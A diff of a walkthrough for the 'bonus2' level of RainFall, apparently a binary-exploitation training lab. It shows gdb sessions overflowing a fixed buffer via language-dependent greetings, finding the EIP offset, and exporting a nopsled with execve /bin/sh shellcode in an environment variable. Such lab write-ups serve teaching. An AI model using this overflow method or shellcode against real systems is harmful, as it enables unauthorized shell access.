@@ -8,15 +8,27 @@
 
 We first recreate the original program in C.
 
-Then, we see that a buffer overflow is really easy
+Then, here is the program under normal use:
+
+bonus2@RainFall:~$ LANG=en ./bonus2 awoimbee lol
+Hello awoimbee
+bonus2@RainFall:~$ LANG=fi ./bonus2 awoimbee lol
+Hyvää päivää awoimbee
+bonus2@RainFall:~$ LANG=nl ./bonus2 awoimbee lol
+Goedemiddag! awoimbee
+
+Then, we see that a buffer overflow is really easy:
+greetuser() copies a variable length string into a fixed buffer of 19B.
+Indeed, the string passed to greetuser() comes from one buffer of 76B.
+This string can even be non-null-terminated !
 
 (gdb) set env LANG=en
 (gdb) run $(python2 -c "print 'A'*40 + ' ' + 'B'*32")
 Program received signal SIGSEGV, Segmentation fault.
 0x08004242 in ?? ()
 
-We have almost overwritten a pointer (?).
-We canot use a longer input, but we can switch language :)
+We have almost overwritten a pointer ?.
+We canot use a longer input (because of strncpy), but we can switch language :)
 
 Here are the size of the greetings:
 - en: 7
@@ -34,13 +46,18 @@ eip            0x42424242       0x42424242
 
 We have overriden eip !
 
-Again, we use We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
 (gdb) run $(python2 -c "print 'A'*40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
 0x41366141 in ?? ()
 -> offset is 18
 
-Ok, let's do it just like in bonus0 (execute shellcode from env var)
+Ok, proceed just like in bonus0 (execute shellcode from env var)
 -> Notice the big nopsled: the exploit would not work otherwise
+
+On the host:
+~$ gcc -m32 -o ./getenv ./bonus2/Ressources/getenv.c
+~$ scp -P 4242 ./getenv bonus2@192.168.122.237:/tmp
 
 bonus2@RainFall:~$ export LANG=fi
 bonus2@RainFall:~$ export SCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
